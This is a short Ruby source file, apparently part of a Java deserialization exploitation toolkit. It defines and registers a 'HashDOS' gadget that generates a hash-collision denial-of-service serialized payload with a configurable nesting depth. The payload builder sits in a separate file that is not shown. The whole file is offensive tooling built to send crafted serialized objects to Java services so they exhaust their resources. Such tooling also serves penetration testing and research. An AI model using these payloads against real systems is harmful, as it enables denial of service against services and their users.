

require_relative '../payloads/dos'

class HashDOS < Java::Gadgets::Gadget
  def id
    'hashdos'
  end

  def usable(_ctx, params: {})
    true
  end

  def targets
    []
  end

  def auto?
    false
  end

  def create(_ctx, params: {})
    Java::Serialize::Payloads::DOS.make_hash_dos(params.fetch('dosDepth', 30))
  end
end

Java::Gadgets.register(
  HashDOS.new
)
